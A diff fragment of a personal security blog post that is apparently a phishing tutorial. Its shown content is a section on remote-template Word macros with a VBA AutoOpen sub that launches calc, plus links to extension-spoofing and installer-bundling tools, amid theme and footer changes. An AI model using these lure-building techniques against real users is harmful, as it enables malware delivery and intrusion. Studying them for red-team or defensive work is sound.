 <h3 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h3><p>First create a document with template, then create a template which enables macro. Modify the document with template, to let it link to the template we created.<br>Write macro in template <code>xxx.dotm</code>:</p>
 <figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line">Shell <span class="string">&quot;calc&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>
@@ -441,7 +469,9 @@
 <p>A simple program with a graphical user interface to spoof file extensions and icons: <a class="link"   target="_blank" rel="noopener" href="https://github.com/henriksb/ExtensionSpoofer" >FileSpoofer<i class="fas fa-external-link-alt"></i></a></p>
 <p>Bundle install: <a class="link"   target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/MatryoshkaDollTool" >MatryoshkaDollTool<i class="fas fa-external-link-alt"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://www.indigorose.com/setup-factory/" >Setup Factory<i class="fas fa-external-link-alt"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://github.com/H4de5-7/Bundler-bypass" >Bundler-bypass<i class="fas fa-external-link-alt"></i></a></p>
 
+                    
                 </div>
+
                 
 
                 <div class="post-bottom-tags-and-share border-box">
@@ -526,7 +556,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Set-Up-Phishing-Mail-Server"><span class="nav-number">1.</span> <span class="nav-text">Set Up Phishing Mail Server</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Camouflage-Malicious-PE"><span class="nav-number">2.</span> <span class="nav-text">Camouflage Malicious PE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SFX"><span class="nav-number">2.1.</span> <span class="nav-text">SFX</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DLL-Hijacking-amp-Recreate-the-Installer"><span class="nav-number">2.2.</span> <span class="nav-text">DLL Hijacking &amp; Recreate the Installer</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Make-Evil-Links-x2F-Shotcuts"><span class="nav-number">3.</span> <span class="nav-text">Make Evil Links&#x2F;Shotcuts</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Evil-CHM-to-Phish"><span class="nav-number">4.</span> <span class="nav-text">Evil CHM to Phish</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Create-Evil-Office-Suite"><span class="nav-number">5.</span> <span class="nav-text">Create Evil Office Suite</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Macros-in-Word"><span class="nav-number">5.1.</span> <span class="nav-text">Macros in Word</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Macros-in-Excel"><span class="nav-number">5.2.</span> <span class="nav-text">Macros in Excel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OLE"><span class="nav-number">5.3.</span> <span class="nav-text">OLE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JS"><span class="nav-number">5.4.</span> <span class="nav-text">JS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Template"><span class="nav-number">5.5.</span> <span class="nav-text">Template</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE"><span class="nav-number">5.6.</span> <span class="nav-text">CVE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phish-in-PPSX"><span class="nav-number">5.7.</span> <span class="nav-text">Phish in PPSX</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#The-Ultra-One"><span class="nav-number">5.8.</span> <span class="nav-text">The Ultra One</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Other-Resources"><span class="nav-number">6.</span> <span class="nav-text">Other Resources</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Set-Up-Phishing-Mail-Server"><span class="nav-number">1.</span> <span class="nav-text">Set Up Phishing Mail Server</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Camouflage-Malicious-PE"><span class="nav-number">2.</span> <span class="nav-text">Camouflage Malicious PE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SFX"><span class="nav-number">2.1.</span> <span class="nav-text">SFX</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DLL-Hijacking-Recreate-the-Installer"><span class="nav-number">2.2.</span> <span class="nav-text">DLL Hijacking &amp; Recreate the Installer</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Make-Evil-Links-Shotcuts"><span class="nav-number">3.</span> <span class="nav-text">Make Evil Links&#x2F;Shotcuts</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Evil-CHM-to-Phish"><span class="nav-number">4.</span> <span class="nav-text">Evil CHM to Phish</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Create-Evil-Office-Suite"><span class="nav-number">5.</span> <span class="nav-text">Create Evil Office Suite</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Macros-in-Word"><span class="nav-number">5.1.</span> <span class="nav-text">Macros in Word</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Macros-in-Excel"><span class="nav-number">5.2.</span> <span class="nav-text">Macros in Excel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OLE"><span class="nav-number">5.3.</span> <span class="nav-text">OLE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JS"><span class="nav-number">5.4.</span> <span class="nav-text">JS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Template"><span class="nav-number">5.5.</span> <span class="nav-text">Template</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE"><span class="nav-number">5.6.</span> <span class="nav-text">CVE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phish-in-PPSX"><span class="nav-number">5.7.</span> <span class="nav-text">Phish in PPSX</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#The-Ultra-One"><span class="nav-number">5.8.</span> <span class="nav-text">The Ultra One</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Other-Resources"><span class="nav-number">6.</span> <span class="nav-text">Other Resources</span></a></li></ol>
     </div>
 </div>
 
@@ -543,29 +573,25 @@
         <div class="page-main-content-bottom border-box">
             
 <footer class="footer border-box">
-    <div class="border-box website-info-box default">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">TyeYeah</a>
         
-            <div class="copyright-info info-item default">
-                &copy;&nbsp;<span>2018</span>&nbsp;-&nbsp;2025
-                
-                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">TyeYeah</a>
-                
-            </div>
+    </div>
 
-            <div class="theme-info info-item default">
-                Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
-            </div>
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
 
+    
+
+    
+        <div class="count-info info-item">
             
-
-            
-        
-
-        <div class="count-item info-item default">
-            
-                <span class="count-box border-box word">
+                <span class="count-item border-box word">
                     <span class="item-type border-box">Total words</span>
-                    <span class="item-value border-box word">137k</span>
+                    <span class="item-value border-box word">137.1k</span>
                 </span>
             
 
@@ -573,7 +599,9 @@
 
             
         </div>
-    </div>
+    
+
+    
 </footer>
 
         </div>
@@ -583,7 +611,10 @@
     
         <div class="post-tools right-toc">
             <div class="post-tools-container border-box">
-    <ul class="tools-list border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
         <!-- PC TOC show toggle -->
         
             <li class="tools-item flex-center toggle-show-toc">
@@ -616,13 +647,17 @@
             <i class="fas fa-search-minus"></i>
         </li>
 
-        <li class="tools-item tool-toggle-theme-mode flex-center">
-            <i class="fas fa-moon"></i>
-        </li>
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
 
         <!-- rss -->
         
 
+        <!-- to bottom -->
         <li class="tools-item tool-scroll-to-bottom flex-center">
             <i class="fas fa-arrow-down"></i>
         </li>
@@ -694,7 +729,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Set-Up-Phishing-Mail-Server"><span class="nav-number">1.</span> <span class="nav-text">Set Up Phishing Mail Server</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Camouflage-Malicious-PE"><span class="nav-number">2.</span> <span class="nav-text">Camouflage Malicious PE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SFX"><span class="nav-number">2.1.</span> <span class="nav-text">SFX</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DLL-Hijacking-amp-Recreate-the-Installer"><span class="nav-number">2.2.</span> <span class="nav-text">DLL Hijacking &amp; Recreate the Installer</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Make-Evil-Links-x2F-Shotcuts"><span class="nav-number">3.</span> <span class="nav-text">Make Evil Links&#x2F;Shotcuts</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Evil-CHM-to-Phish"><span class="nav-number">4.</span> <span class="nav-text">Evil CHM to Phish</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Create-Evil-Office-Suite"><span class="nav-number">5.</span> <span class="nav-text">Create Evil Office Suite</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Macros-in-Word"><span class="nav-number">5.1.</span> <span class="nav-text">Macros in Word</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Macros-in-Excel"><span class="nav-number">5.2.</span> <span class="nav-text">Macros in Excel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OLE"><span class="nav-number">5.3.</span> <span class="nav-text">OLE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JS"><span class="nav-number">5.4.</span> <span class="nav-text">JS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Template"><span class="nav-number">5.5.</span> <span class="nav-text">Template</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE"><span class="nav-number">5.6.</span> <span class="nav-text">CVE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phish-in-PPSX"><span class="nav-number">5.7.</span> <span class="nav-text">Phish in PPSX</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#The-Ultra-One"><span class="nav-number">5.8.</span> <span class="nav-text">The Ultra One</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Other-Resources"><span class="nav-number">6.</span> <span class="nav-text">Other Resources</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Set-Up-Phishing-Mail-Server"><span class="nav-number">1.</span> <span class="nav-text">Set Up Phishing Mail Server</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Camouflage-Malicious-PE"><span class="nav-number">2.</span> <span class="nav-text">Camouflage Malicious PE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SFX"><span class="nav-number">2.1.</span> <span class="nav-text">SFX</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DLL-Hijacking-Recreate-the-Installer"><span class="nav-number">2.2.</span> <span class="nav-text">DLL Hijacking &amp; Recreate the Installer</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Make-Evil-Links-Shotcuts"><span class="nav-number">3.</span> <span class="nav-text">Make Evil Links&#x2F;Shotcuts</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Evil-CHM-to-Phish"><span class="nav-number">4.</span> <span class="nav-text">Evil CHM to Phish</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Create-Evil-Office-Suite"><span class="nav-number">5.</span> <span class="nav-text">Create Evil Office Suite</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Macros-in-Word"><span class="nav-number">5.1.</span> <span class="nav-text">Macros in Word</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Macros-in-Excel"><span class="nav-number">5.2.</span> <span class="nav-text">Macros in Excel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OLE"><span class="nav-number">5.3.</span> <span class="nav-text">OLE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JS"><span class="nav-number">5.4.</span> <span class="nav-text">JS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Template"><span class="nav-number">5.5.</span> <span class="nav-text">Template</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE"><span class="nav-number">5.6.</span> <span class="nav-text">CVE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phish-in-PPSX"><span class="nav-number">5.7.</span> <span class="nav-text">Phish in PPSX</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#The-Ultra-One"><span class="nav-number">5.8.</span> <span class="nav-text">The Ultra One</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Other-Resources"><span class="nav-number">6.</span> <span class="nav-text">Other Resources</span></a></li></ol>
     </div>
 </div>
 
@@ -705,7 +740,9 @@
 
 
 
-<!-- common -->
+
+
+<!-- common js -->
 
 <script src="/js/utils.js"></script>
 
@@ -722,7 +759,7 @@
 <script src="/js/libs/anime.min.js"></script>
 
 
-<!-- local-search -->
+<!-- local search -->
 
     
 <script src="/js/local-search.js"></script>
@@ -733,6 +770,10 @@
 
 
 <div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
     
         <!-- post-helper -->
         
